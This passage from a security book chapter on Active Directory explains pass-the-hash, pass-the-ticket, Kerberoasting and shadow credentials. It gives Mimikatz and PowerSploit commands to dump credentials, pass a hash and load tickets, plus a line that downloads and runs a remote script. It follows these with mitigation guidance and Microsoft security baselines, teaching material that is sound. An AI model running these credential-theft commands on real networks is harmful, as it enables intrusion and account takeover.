			<p>As you <a id="_idIndexMarker1173"/>have learned, for NTLM <a id="_idIndexMarker1174"/>authentication, as well as for LAN Manager authentication, a hash is generated that allows you to authenticate to access resources and log on. This hash is stored in the LSA, which is managed by the <strong class="bold">Local Security Authority Subsystem Service</strong> (<strong class="bold">LSASS</strong>) process and can be quickly accessed to<a id="_idIndexMarker1175"/> <span class="No-Break">allow SSO.</span></p>
			<p>If an adversary extracts this hash from the LSA, it can be passed on to another system to authenticate as the user for which the hash <span class="No-Break">was created.</span></p>
			<p>It is really hard to detect that a <em class="italic">pass-the-hash</em> attack has occurred, as on the target system, everything looks like a legitimate authentication <span class="No-Break">has occurred.</span></p>
			<p>To extract <a id="_idIndexMarker1176"/>hashes from the LSA, the account that performs this action needs to run under administrator or system rights. For many commands, debug rights are needed <span class="No-Break">as well.</span></p>
			<p>There are<a id="_idIndexMarker1177"/> many tools that can interact with the LSA to extract password hashes. One of the most famous ones is Mimikatz. While <strong class="source-inline">Mimikatz.exe</strong> was written by Benjamin Delpy (<strong class="source-inline">gentilkiwi</strong>), the <a id="_idIndexMarker1178"/>DCSync function in the <strong class="source-inline">lsa</strong> module was written by Vincent le <span class="No-Break">Toux: </span><a href="https://github.com/gentilkiwi/mimikatz/wiki"><span class="No-Break">https://github.com/gentilkiwi/mimikatz/wiki</span></a><span class="No-Break">.</span></p>
			<p>Joseph Bialek wrote the <strong class="source-inline">Invoke-Mimikatz.ps1</strong> script to make all <strong class="source-inline">mimikatz</strong> functions available via PowerShell. <strong class="source-inline">Invoke-Mimikatz</strong> is a part of the PowerSploit module, which can be<a id="_idIndexMarker1179"/> downloaded on <span class="No-Break">GitHub: </span><a href="https://github.com/PowerShellMafia/PowerSploit"><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit</span></a><span class="No-Break">.</span></p>
			<p>Although this module is no longer supported, it still contains many valuable scripts that can be used for penetration testing <span class="No-Break">using PowerShell.</span></p>
			<p>To install PowerSploit, simply download the module and paste it under the following path: <strong class="source-inline">$Env:windir\System32\WindowsPowerShell\v1.0\Modules</strong> (this is normally <strong class="source-inline">C:\Windows\System32\WindowsPowerShell\v1.0\Modules</strong> on regular systems). When you are downloading the PowerSploit <strong class="source-inline">.zip</strong> file, the file is called <strong class="source-inline">PowerSploit-master</strong>, so you want to rename the folder <strong class="source-inline">PowerSploit</strong> before pasting it into the module <span class="No-Break">path: </span><span class="No-Break"><strong class="source-inline">C:\Windows\System32\WindowsPowerShell\v1.0\Modules\PowerSploit</strong></span><span class="No-Break">.</span></p>
			<p>Use <strong class="source-inline">Import-Module PowerSploit</strong> to import it into the current session. Note that it can be imported only in Windows PowerShell and throws errors in <span class="No-Break">PowerShell Core.</span></p>
			<p class="callout-heading">Unblock the Module Recursively</p>
			<p class="callout">If your execution policy is set to <strong class="source-inline">RemoteSigned</strong>, the execution of remote scripts is forbidden, as well as the execution of scripts or the import of modules that were downloaded from the internet. To unblock all files in the <strong class="source-inline">PowerSploit</strong> module folder recursively, run the <span class="No-Break">following command:</span></p>
			<p class="callout"><strong class="source-inline">Get-ChildItem -Path "$Env:windir\System32\WindowsPowerShell\v1.0\Modules\PowerSploit\" -Recurse | </strong><span class="No-Break"><strong class="source-inline">Unblock-File</strong></span></p>
			<p>Once<a id="_idIndexMarker1180"/> PowerSploit was imported successfully, you can use <strong class="source-inline">Invoke-Mimikatz</strong> to dump credentials on the <span class="No-Break">local computer:</span></p>
			<pre class="source-code">
&gt; Invoke-Mimikatz -DumpCreds</pre>
			<p>Using<a id="_idIndexMarker1181"/> the <strong class="source-inline">-ComputerName</strong> parameter, you can specify one or more <span class="No-Break">remote computers:</span></p>
			<pre class="source-code">
&gt; Invoke-Mimikatz -DumpCreds -ComputerName "PSSec-PC01"
&gt; Invoke-Mimikatz -DumpCreds -ComputerName @(PSSec-PC01, PSSec-PC02)</pre>
			<p>You can also use <strong class="source-inline">Invoke-Mimikatz</strong> to run commands that are usually also available in the Mimikatz binary, such as elevating the privileges on a <span class="No-Break">remote computer:</span></p>
			<pre class="source-code">
&gt; Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "PSSec-PC01"</pre>
			<p>In general, every command that is possible in the normal binary version of <strong class="source-inline">mimikatz.exe</strong> can be run in the PowerShell version using the <strong class="source-inline">-</strong><span class="No-Break"><strong class="source-inline">Command</strong></span><span class="No-Break"> parameter.</span></p>
			<p>Since the <strong class="source-inline">Invoke-Mimikatz</strong> cmdlet only works in Windows PowerShell and not in PowerShell 7 and upward and has some more restrictions (such as it only being possible to extract credentials from your current session), we will switch to the binary Mimikatz version for <span class="No-Break">our demos.</span></p>
			<p>After downloading the binary files or building them from the source code, go to the directory where the <strong class="source-inline">mimikatz.exe</strong> file is located, and execute it by typing the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
&gt; .\mimikatz.exe</pre>
			<p>This will load Mimikatz, allowing you to enter commands for its <span class="No-Break">various functionalities:</span></p>
			<pre class="source-code">
&gt; log
&gt; privilege::debug
&gt; sekurlsa::logonpasswords</pre>
			<p>The <a id="_idIndexMarker1182"/>Mimikatz <strong class="source-inline">log</strong> command enables or disables the Mimikatz logs. By default, logging is disabled. When logging is enabled, Mimikatz will write its output to a log file. If no log file is specified (as in this example) it writes <strong class="source-inline">mimikatz.log</strong> to the folder from where Mimikatz <span class="No-Break">was called.</span></p>
			<p>The <strong class="source-inline">privilege::debug</strong> command enables debug privileges for the current process, which<a id="_idIndexMarker1183"/> is necessary to access certain sensitive information on the system. The <strong class="source-inline">sekurlsa::logonpasswords</strong> command is used to retrieve passwords in plaintext that are currently stored in memory for active logon sessions on <span class="No-Break">the system.</span></p>
			<p>As a next step, open the <strong class="source-inline">mimikatz.log</strong> file and search for the hash of your interest. In our case, we are looking for the domain administrator password of the <span class="No-Break"><strong class="source-inline">PSSec</strong></span><span class="No-Break"> domain:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer162">
					<img alt="Figure 6.10 – Extracting the domain administrator’s NTLM hash" src="image/B16679_06_010.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.10 – Extracting the domain administrator’s NTLM hash</p>
			<p>Copy the NTLM hash and use it as shown in the following example to load a <strong class="source-inline">cmd</strong> console that has the domain administrator’s credentials loaded into <span class="No-Break">the session:</span></p>
			<pre class="source-code">
&gt; Sekurlsa::pth /user:administrator /domain:PSSec /ntlm:7dfa0531d73101ca080c7379a9bff1c7</pre>
			<p>A <strong class="source-inline">cmd</strong> console opens that has the domain administrator’s credentials loaded into the session, which now can be used to authenticate against a <span class="No-Break">remote system:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer163">
					<img alt="Figure 6.11 – Performing a pass-the-hash attack" src="image/B16679_06_011.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.11 – Performing a pass-the-hash attack</p>
			<p>In this <a id="_idIndexMarker1184"/>example, we<a id="_idIndexMarker1185"/> use <strong class="source-inline">PSExec</strong> to authenticate to the domain controller, <strong class="source-inline">DC01</strong>, which has the IP address <strong class="source-inline">172.29.0.10</strong>. It should be also possible to use a PowerShell session, where the IP address is provided instead of the DNS name, when the configuration allows it to connect from this particular computer. However, <strong class="source-inline">PSExec</strong> does not rely on PowerShell session configurations and other restrictions and is commonly used <span class="No-Break">by attackers.</span></p>
			<h3>Pass the ticket (PtT)</h3>
			<p>As <a id="_idIndexMarker1186"/>well as LM or NTLM hashes, tickets<a id="_idIndexMarker1187"/> are also stored in the LSA to <span class="No-Break">allow SSO.</span></p>
			<p>You can use Mimikatz to export all tickets that are available in the session using <span class="No-Break">the following:</span></p>
			<pre class="source-code">
kerberos::list /export</pre>
			<p>After the tickets are successfully exported, you can find all exported ticket files in the current work folder. To proceed with a PtT attack, you now look for a ticket that suits your purposes best. In our case, we are looking for a ticket that was issued to a domain administrator by <strong class="source-inline">krbtgt</strong>; therefore, we choose one of the tickets that contain <strong class="source-inline">administrator</strong> and <strong class="source-inline">krbtgt</strong> in their filename, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer164">
					<img alt="Figure 6.12 – Exported domain administrator tickets" src="image/B16679_06_012.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.12 – Exported domain administrator tickets</p>
			<p>Now we <a id="_idIndexMarker1188"/>can load one <a id="_idIndexMarker1189"/>of the tickets to our session by using the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
&gt; kerberos::ptt [0;2856bf]-2-0-40e10000-administrator@krbtgt-PSSEC.LOCAL.kirbi
&gt; misc::cmd</pre>
			<p>The <strong class="source-inline">misc::cmd</strong> command allows you to open a <strong class="source-inline">cmd</strong> command line, which you can use for further activity <span class="No-Break">from here.</span></p>
			<h3>Kerberoasting</h3>
			<p><strong class="bold">Kerberoasting</strong> is<a id="_idIndexMarker1190"/> a type of attack <a id="_idIndexMarker1191"/>that involves the exploitation of vulnerabilities in the Kerberos authentication protocol. In this attack, an attacker can extract password hashes from a service account that uses Kerberos authentication, and then use these hashes to attempt to crack the passwords offline. Once the attacker has successfully cracked a password, they can use it to gain unauthorized access to other systems and <span class="No-Break">sensitive data.</span></p>
			<p>To perform a Kerberoasting attack, an attacker typically starts by identifying service accounts that use Kerberos authentication. These accounts often have SPNs associated with them. Tim Medin wrote a script that helps you identify accounts with an SPN, which you can download from GitHub <span class="No-Break">and execute:</span></p>
			<pre class="source-code">
&gt; Invoke-Expression (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1")</pre>
			<p>The <a id="_idIndexMarker1192"/>following screenshot <a id="_idIndexMarker1193"/>shows how we run the script and find the <strong class="source-inline">IIS-User</strong> account, which has an <span class="No-Break">SPN set:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer165">
					<img alt="Figure 6.13 – Retrieving accounts with an SPN" src="image/B16679_06_013.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.13 – Retrieving accounts with an SPN</p>
			<p>The attacker then requests a TGT for the service account from the Kerberos authentication service, as shown in <span class="No-Break">the following:</span></p>
			<pre class="source-code">
&gt; Add-Type -AssemblyName System.IdentityModel
&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList IIS-User/server.PSSec.local:80</pre>
			<p>Once the attacker has obtained the service tickets, they can extract the encrypted hash for the ticket by using Mimikatz or a similar tool. Using Mimikatz, you can extract tickets with the <strong class="source-inline">kerberos::list /</strong><span class="No-Break"><strong class="source-inline">export</strong></span><span class="No-Break"> command.</span></p>
			<p>All available tickets will be extracted into the folder from which you have been running <strong class="source-inline">mimikatz.exe</strong> with the <strong class="source-inline">.kirbi</strong> <span class="No-Break">file extension.</span></p>
			<p>Before an attacker can attempt to crack the password out of the ticket hash, they would need to be converted first. The <strong class="source-inline">Invoke-Kerberoast.ps1</strong> script out of <strong class="source-inline">EmpireProject</strong> provides a very comfortable method to do so. The script can be downloaded <span class="No-Break">from </span><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1"><span class="No-Break">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1</span></a><span class="No-Break">.</span></p>
			<p>Use the following commands to convert the extracted tickets into a <strong class="source-inline">.</strong><span class="No-Break"><strong class="source-inline">csv</strong></span><span class="No-Break"> file:</span></p>
			<pre class="source-code">
&gt; Import-Module .\Invoke-Kerberoast.ps1
&gt; Invoke-Kerberoast -Format Hashcat | Select-Object Hash | ConvertTo-Csv -NoTypeInformation | Out-File kerberoast-hashes.csv</pre>
			<p>The <a id="_idIndexMarker1194"/>attacker can then use offline<a id="_idIndexMarker1195"/> password-cracking tools <a id="_idIndexMarker1196"/>such as <strong class="bold">Hashcat</strong> in combination with password lists to attempt to crack the hashes and recover the passwords. If successful, the attacker can then use the compromised passwords to gain unauthorized access to other systems and <span class="No-Break">sensitive data.</span></p>
			<h3>Shadow credential attack</h3>
			<p>The <a id="_idIndexMarker1197"/>shadow credential attack is an attack technique that can lead to the compromise of domain controllers in AD environments. It involves the creation of a “shadow” domain account with the same password as a privileged user account, which can be used to impersonate the privileged user and execute <span class="No-Break">sensitive operations.</span></p>
			<p>A shadow credential attack <a id="_idIndexMarker1198"/>is a sophisticated technique that requires the attacker to meet several prerequisites to compromise a domain controller in an AD environment. Firstly, the attack can only be executed on a domain controller running on Windows Server 2016 or higher. Additionally, the domain must have Active Directory Certificate Services and Certificate Authority configured to obtain the necessary certificates for PKINIT Kerberos authentication. PKINIT allows for certificate-based authentication instead of a username and password, which is crucial for the success of the attack. Finally, the attacker must have an account with delegated rights to write to the <strong class="source-inline">msDS-KeyCredentialLink</strong> attribute of the target object. This attribute links an RSA key pair with a computer or user object, enabling authentication with the key pair to receive a Kerberos TGT from <span class="No-Break">the KDC.</span></p>
			<p>To accomplish this attack, key credentials must be added to the <strong class="source-inline">msDS-KeyCredentialLink</strong> attribute of a target user or computer object. With these credentials, the attacker can perform Kerberos authentication as the target account using PKINIT to obtain a TGT, with pre-authentication verifying the private <span class="No-Break">key match.</span></p>
			<p>Be aware that computer objects have the ability to modify their own <strong class="source-inline">msDS-KeyCredentialLink</strong> attribute, but they can only add <strong class="source-inline">KeyCredential</strong> if none already exists. User objects, however, are unable to edit their own <span class="No-Break"><strong class="source-inline">msDS-KeyCredentialLink</strong></span><span class="No-Break"> attribute.</span></p>
			<p>The<a id="_idIndexMarker1199"/> linking process <a id="_idIndexMarker1200"/>provided by the <strong class="source-inline">msDS-KeyCredentialLink</strong> attribute enables users to authenticate with an RSA key pair to receive a TGT from the KDC without providing their username <span class="No-Break">and password.</span></p>
			<p>This technique is similarly effective for privilege escalation such as a password reset, but it is a more silent method that organizations are less likely <span class="No-Break">to detect.</span></p>
			<p>For more information on the shadow credential attack, please refer to the following blog <span class="No-Break">post: </span><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"><span class="No-Break">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</span></a><span class="No-Break">.</span></p>
			<p>Now that we have looked into various AD attack vectors, you might ask yourself what you can do to reduce your exposure. AD is huge, but there are some things that you <span class="No-Break">can do.</span></p>
			<h1 id="_idParaDest-166"><a id="_idTextAnchor174"/>Mitigation</h1>
			<p>As general advice, be careful which account is allowed to log on to <a id="_idIndexMarker1201"/>which machine and protect your privileged accounts. To mitigate these kinds of attacks, it is crucial to control access and to keep good <span class="No-Break">credential hygiene.</span></p>
			<p>Enumeration<a id="_idIndexMarker1202"/> is a process to get more information about the environment, so mitigating enumeration entirely is not possible. But you can make it harder for adversaries to find valuable targets. Enumerate your AD rights and adjust privileges by using the least-privilege principle before an attacker abuses found vulnerabilities. Also, use the Microsoft baselines to compare your configuration with the official recommendation. We will look into the Microsoft baselines in the <span class="No-Break">next section.</span></p>
			<p>It is important to follow good security practices such as limiting the use of service accounts, implementing strong password policies, and regularly monitoring and auditing authentication logs for suspicious activity. In addition, network segmentation and access controls can help limit the impact of a successful credential theft attack by isolating critical systems and data from <span class="No-Break">potential attackers.</span></p>
			<p>By <a id="_idIndexMarker1203"/>implementing proper auditing, you can get more insights into what is going on in your environment (see <a href="B16679_04_Final_PD.xhtml#_idTextAnchor090"><span class="No-Break"><em class="italic">Chapter 4</em></span></a>, <em class="italic">Detection – Auditing and Monitoring</em>, for <span class="No-Break">more details).</span></p>
			<p>Using only event IDs to build proper auditing is hard and does not help you to detect all attacks. For example, by using only event IDs, it is impossible to detect a pass-the-hash attack: in the event log, this attack just looks like a legitimate authentication on the <span class="No-Break">target machine.</span></p>
			<p>Therefore, many vendors have started to work on analyzing the streams between systems to also provide a good detection for attacks such as PtH or PtT. Microsoft’s solution is, for example, Microsoft Defender for Identity, which focuses on identity-related attacks and is part of Microsoft <span class="No-Break">365 Defender.</span></p>
			<p>Please also refer to the extensive PtH whitepaper to learn more about the PtH attack and how it can be <span class="No-Break">mitigated: </span><a href="https://www.microsoft.com/en-us/download/details.aspx?id=36036"><span class="No-Break">https://www.microsoft.com/en-us/download/details.aspx?id=36036</span></a><span class="No-Break">.</span></p>
			<p>If the <strong class="source-inline">ntds.dit</strong> file was extracted by an attacker, the only thing that helps is a controlled compromise recovery and twice resetting the password of the <strong class="source-inline">krbtgt</strong> account, as well as of other domain/forest administrator accounts. Make sure to monitor for suspicious activities during this compromise recovery to ensure that the <strong class="source-inline">krbtgt</strong> account (and other administrative accounts) is still under your control, and your <span class="No-Break">control only.</span></p>
			<p>Work out<a id="_idIndexMarker1204"/> a <strong class="bold">privileged access strategy</strong> that works for your environment. This can be a complex and challenging process until it is implemented effectively, but it is an essential step toward securing <span class="No-Break">your network.</span></p>
			<p>Please refer to the following guidance to get started with your privileged access <span class="No-Break">strategy: </span><a href="https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model"><span class="No-Break">https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model</span></a><span class="No-Break">.</span></p>
			<p>In addition, administrators should <a id="_idIndexMarker1205"/>use <strong class="bold">privileged access workstations</strong> (<strong class="bold">PAWs</strong>) when using your environment’s high-privileged accounts. PAWs are dedicated workstations that are used exclusively for administrative tasks and managing highly privileged accounts. They provide a<a id="_idTextAnchor175"/> secure environment for privileged activities by limiting access to the internet, email, and other potentially vulnerable applications. By using a PAW, administrators can help reduce the risk of privileged account compromise and lateral movement <span class="No-Break">by attackers.</span></p>
			<h1 id="_idParaDest-167"><a id="_idTextAnchor176"/>Microsoft baselines and the security compliance toolkit</h1>
			<p>To help with the hardening of organizations’ environments, Microsoft released the Security Compliance Toolkit. Download<a id="_idIndexMarker1206"/> the <a id="_idIndexMarker1207"/>Security Compliance Toolkit <span class="No-Break">from </span><a href="https://www.microsoft.com/en-us/download/details.aspx?id=55319"><span class="No-Break">https://www.microsoft.com/en-us/download/details.aspx?id=55319</span></a><span class="No-Break">.</span></p>
			<p>This toolkit contains <span class="No-Break">the following:</span></p>
			<ul>
				<li><strong class="bold">Policy Analyzer</strong>: A <a id="_idIndexMarker1208"/>tool to evaluate and <a id="_idIndexMarker1209"/>compare <span class="No-Break">Group Policies.</span></li>
				<li><strong class="source-inline">LGPO.exe</strong>: A tool <a id="_idIndexMarker1210"/>to analyze <span class="No-Break">local </span><span class="No-Break"><a id="_idIndexMarker1211"/></span><span class="No-Break">policies.</span></li>
				<li><strong class="source-inline">SetObjectSecurity.exe</strong>: A<a id="_idIndexMarker1212"/> tool <a id="_idIndexMarker1213"/>to configure security descriptors for almost every Windows <span class="No-Break">security object.</span></li>
				<li><strong class="bold">Baselines for each recent operating system</strong>: These baselines contain monitoring <a id="_idIndexMarker1214"/>as well as <span class="No-Break">configuration recommendations.</span></li>
			</ul>
			<p>You can find an overview <a id="_idIndexMarker1215"/>of all security baseline GPOs if you open the respective <strong class="source-inline">GP Reports</strong> folder of <span class="No-Break">each baseline:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer166">
					<img alt="Figure 6.14 – Overview of all GPOs of a single baseline" src="image/B16679_06_014.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.14 – Overview of all GPOs of a single baseline</p>
			<p>All security baselines<a id="_idIndexMarker1216"/> were created for different configuration purposes. Some of the most important configuration purposes that repeat themselves within each baseline are <span class="No-Break">the following:</span></p>
			<ul>
				<li><strong class="bold">Domain Controller</strong>: This<a id="_idIndexMarker1217"/> is the hardening recommendation for domain controllers and PAWs that are used to administer domain controllers and other Tier <span class="No-Break">0 assets.</span></li>
				<li><strong class="bold">Domain Security</strong>: This<a id="_idIndexMarker1218"/> baseline contains best practices on how to configure general domain settings such as the password policy or account logon timeouts <span class="No-Break">and lockouts.</span></li>
				<li><strong class="bold">Member Server</strong>: This is the hardening recommendation for member servers and PAWs that are used to administer <a id="_idIndexMarker1219"/>member servers and other Tier <span class="No-Break">1 assets.</span></li>
				<li><strong class="bold">Computer</strong>: This<a id="_idIndexMarker1220"/> is the hardening recommendation for all client devices as well as terminal servers in <span class="No-Break">Tier 2.</span></li>
				<li><strong class="bold">User</strong>: This<a id="_idIndexMarker1221"/> is the hardening recommendation on the user level for Tier <span class="No-Break">2 users.</span></li>
			</ul>
			<p>There are also other baselines such as recommendations on how to configure BitLocker, Credential Guard, and Defender Antivirus, as well as recommendations on how to configure domain controllers with virtualization-based <span class="No-Break">security enabled.</span></p>
			<p>Choose each baseline for each operating system according to your <span class="No-Break">use case.</span></p>
			<p class="callout-heading">Did You Know?</p>
			<p class="callout">GPO baselines and Intune baselines were created by the same team and <span class="No-Break">are identical.</span></p>
			<h1 id="_idParaDest-168"><a id="_idTextAnchor177"/>Summary</h1>
			<p>In this chapter, you have learned some basics of AD security. As AD is a huge topic that would cover an entire book itself, we concentrated on AD security from a credential theft and access <span class="No-Break">rights perspective.</span></p>
			<p>You have learned how to implement some basic auditing checks and which open source tools can help you to <span class="No-Break">enumerate AD.</span></p>
			<p>You now know which accounts and groups are privileged in AD and that you should be very careful when delegating access rights. It is also not enough to just deploy AD out of the box; you also need to <span class="No-Break">harden it.</span></p>
			<p>Finally, we dived deep into the authentication protocols that are used within AD and also explored how they can <span class="No-Break">be abused.</span></p>
			<p>We have also discussed <em class="italic">some</em> mitigations, but make sure to also follow the advice in <a href="B16679_13_Final_PD.xhtml#_idTextAnchor341"><span class="No-Break"><em class="italic">Chapter 13</em></span></a>, <em class="italic">What Else? – Further Mitigations </em><span class="No-Break"><em class="italic">and Resources</em></span><span class="No-Break">.</span></p>
			<p>But when we are talking about AD, AAD (or how it will be called in the future: <strong class="bold">Entra ID</strong>) is not far away. Although both services are amazing identity providers, it is important to understand the differences, which we will do in our <span class="No-Break">next chapter.</span></p>
			<p>One thing I can already tell you: no, Azure Active Directory is not “just Active Directory, but in the cloud.” </p>
			<h1 id="_idParaDest-169"><a id="_idTextAnchor178"/>Further reading</h1>
			<p>If you want to explore more deeply some of the topics that were mentioned in this chapter, check out <span class="No-Break">these resources:</span></p>
			<p><span class="No-Break"><strong class="bold">Access rights</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li><span class="No-Break">Get-Acl: </span><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl</span></a><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl&#13;"/></li>
				<li><span class="No-Break">Set-Acl: </span><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-acl</span></a></li>
				<li>DS-Replication-Get-Changes-All extended <span class="No-Break">right: </span><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all"><span class="No-Break">https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all</span></a><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all&#13;"/></li>
			</ul>
			<p><strong class="bold">Active Directory-related PowerShell modules (Part of the </strong><span class="No-Break"><strong class="bold">RSAT tool)</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>ActiveDirectory <span class="No-Break">module: </span><a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/activedirectory</span></a><a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory&#13;"/></li>
				<li>GroupPolicy <span class="No-Break">module: </span><a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/module/grouppolicy/</span></a><a href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/&#13;"/></li>
			</ul>
			<p><strong class="bold">Active Directory-related open source </strong><span class="No-Break"><strong class="bold">attacker tools</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Domain Password <span class="No-Break">Spray: </span><a href="https://github.com/dafthack/domainPasswordSpray"><span class="No-Break">https://github.com/dafthack/domainPasswordSpray</span></a><a href="https://github.com/dafthack/domainPasswordSpray"/></li>
				<li><span class="No-Break">PowerSploit: </span><a href="https://github.com/PowerShellMafia/PowerSploit"><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit</span></a></li>
				<li><span class="No-Break">PowerView: </span><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"><span class="No-Break">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</span></a><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon&#13;"/></li>
				<li><span class="No-Break">Mimikatz: </span><span class="No-Break">https://github.com/gentilkiwi/mimikatz/wiki</span></li>
				<li>Kerberoast <span class="No-Break">tools: </span><a href="https://github.com/nidem/kerberoast"><span class="No-Break">https://github.com/nidem/kerberoast</span></a><a href="https://github.com/nidem/kerberoast&#13;"/></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">Authentication:</strong></span></p>
			<ul>
				<li>Stop using LAN Manager and <span class="No-Break">NTLMv1!: </span><a href="https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/ "><span class="No-Break">https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/</span></a></li>
				<li>Making the second hop in PowerShell <span class="No-Break">remoting: </span><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop "><span class="No-Break">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop</span></a></li>
			</ul>
			<p><strong class="bold">Desired </strong><span class="No-Break"><strong class="bold">State Configuration</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Windows PowerShell Desired State Configuration <span class="No-Break">Overview: </span><a href="https://learn.microsoft.com/en-us/powershell/dsc/overview/decisionmaker?view=dsc-1.1"><span class="No-Break">https://learn.microsoft.com/en-us/powershell/dsc/overview/decisionmaker?view=dsc-1.1</span></a><a href="https://docs.microsoft.com/en-us/powershell/scripting/dsc/overview/overview"/></li>
				<li>Get started with Azure Automation State <span class="No-Break">Configuration: </span><a href="https://docs.microsoft.com/en-us/azure/automation/automation-dsc-getting-started"><span class="No-Break">https://docs.microsoft.com/en-us/azure/automation/automation-dsc-getting-started</span></a></li>
				<li>Quickstart: Convert Group Policy into <span class="No-Break">DSC: </span><a href="https://docs.microsoft.com/en-us/powershell/scripting/dsc/quickstarts/gpo-quickstart"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/scripting/dsc/quickstarts/gpo-quickstart</span></a></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">Enumeration</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Gathering AD Data with the Active Directory PowerShell <span class="No-Break">Module: </span><a href="https://adsecurity.org/?p=3719"><span class="No-Break">https://adsecurity.org/?p=3719</span></a></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">Forest trust</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>How trust relationships work for resource forests in Azure Active Directory Domain <span class="No-Break">Services: </span><a href="https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust"><span class="No-Break">https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust</span></a><a href="https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust&#13;"/></li>
			</ul>
			<p><strong class="bold">Import data to Excel </strong><span class="No-Break"><strong class="bold">and PowerPivot</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Import or export text (<strong class="source-inline">.txt</strong> or <strong class="source-inline">.csv</strong>) <span class="No-Break">files: </span><a href="https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba"><span class="No-Break">https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba</span></a><a href="https://support.microsoft.com/en-us/office/import-or-export-text-txt-or-csv-files-5250ac4c-663c-47ce-937b-339e391393ba&#13;"/></li>
				<li>Tutorial: Import Data into Excel, and Create a Data <span class="No-Break">Model: </span><a href="https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0"><span class="No-Break">https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0</span></a><a href="https://support.microsoft.com/en-us/office/tutorial-import-data-into-excel-and-create-a-data-model-4b4e5ab4-60ee-465e-8195-09ebba060bf0&#13;"/></li>
				<li>Create a PivotTable to analyze worksheet <span class="No-Break">data: </span><a href="https://support.microsoft.com/en-gb/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576"><span class="No-Break">https://support.microsoft.com/en-gb/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576</span></a><a href="https://support.microsoft.com/en-us/office/create-a-pivottable-to-analyze-worksheet-data-a9a84538-bfe9-40a9-a8e9-f99134456576&#13;"/></li>
			</ul>
			<p><span class="No-Break"><strong class="bold">Mitigation</strong></span><span class="No-Break">:</span></p>
			<ul>
				<li>Microsoft Security Compliance Toolkit <span class="No-Break">1.0: </span><a href="https://www.microsoft.com/en-us/download/details.aspx?id=55319"><span class="No-Break">https://www.microsoft.com/en-us/download/details.aspx?id=55319</span></a><a href="https://www.microsoft.com/en-us/download/details.aspx?id=55319&#13;"/></li>
			</ul>
